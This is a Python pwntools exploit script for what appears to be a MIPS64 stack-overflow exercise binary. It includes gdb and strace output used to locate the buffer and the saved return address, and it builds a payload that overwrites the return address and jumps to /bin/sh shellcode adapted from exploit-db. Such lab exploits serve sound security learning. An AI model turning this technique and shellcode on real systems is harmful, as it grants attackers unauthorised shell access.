#!/usr/bin/python

'''
(gdb) disassemble vulnerable 
Dump of assembler code for function vulnerable:
   0x0000000120000c10 <+0>:	daddiu	sp,sp,-160
   0x0000000120000c14 <+4>:	sd	ra,152(sp)
...
   0x0000000120000c9c <+140>:	ld	ra,152(sp)
   0x0000000120000ca0 <+144>:	ld	s8,144(sp)
   0x0000000120000ca4 <+148>:	ld	gp,136(sp)
   0x0000000120000ca8 <+152>:	daddiu	sp,sp,160
   0x0000000120000cac <+156>:	jr	ra
   0x0000000120000cb0 <+160>:	nop
End of assembler dump.
(gdb) b vulnerable 
Breakpoint 1 at 0x120000c30: file src/04-shellcode-static.c, line 6.
(gdb) b *0x0000000120000c9c
Breakpoint 2 at 0x120000c9c: file src/04-shellcode-static.c, line 14.
(gdb) c
Continuing.

Breakpoint 1, vulnerable () at src/04-shellcode-static.c:6
6		printf('> ');
(gdb) p &buffer[0]
$1 = 0x40007ffd60 ''
(gdb) c
Continuing.

Breakpoint 2, 0x0000000120000c9c in vulnerable () at src/04-shellcode-static.c:14
14	}
(gdb) p/x $sp+152
$2 = 0x40007ffdf8
'''

'''
$ qemu-mips64 -L /usr/mips64-linux-gnuabi64/ -strace ./bin/mips64/04-shellcode-static
...
18720 openat(AT_FDCWD,'/lib/libc.so.6',O_RDONLY|O_CLOEXEC) = 3
...
18720 mmap(NULL,1880864,PROT_EXEC|PROT_READ,MAP_PRIVATE|MAP_DENYWRITE,3,0) = 0x000000400085e000
...
'''

import struct
import sys

from pwn import *

context(arch='mips64', os='linux', endian='big', word_size=64)

binary_path = './bin/mips64/04-shellcode-static'

ra_saved_addr = 0x40007ffdf8
buffer_addr = 0x40007ffd60
libc_addr = 0x000000400085e000

# Adapted from https://www.exploit-db.com/exploits/45287
shellcode = \
	'\x62\x2f\x0c\x3c'[::-1] + \
	'\x6e\x69\x8c\x35'[::-1] + \
	'\xf4\xff\xac\xaf'[::-1] + \
	'\x73\x2f\x0d\x3c'[::-1] + \
	'\x00\x68\xad\x35'[::-1] + \
	'\xf8\xff\xad\xaf'[::-1] + \
	'\xf4\xff\xa4\x67'[::-1] + \
	'\xff\xff\x05\x28'[::-1] + \
	'\xff\xff\x06\x28'[::-1] + \
	'\xc1\x13\x02\x24'[::-1] + \
	'\x0c\x01\x01\x01'[::-1]

p = process(binary_path)
#p = gdb.debug([binary_path])

payload = ''
payload += 'a' * (ra_saved_addr - buffer_addr)
payload += p64(ra_saved_addr + 8)
payload += shellcode

p.readuntil('> ')
p.write(payload)
p.interactive()
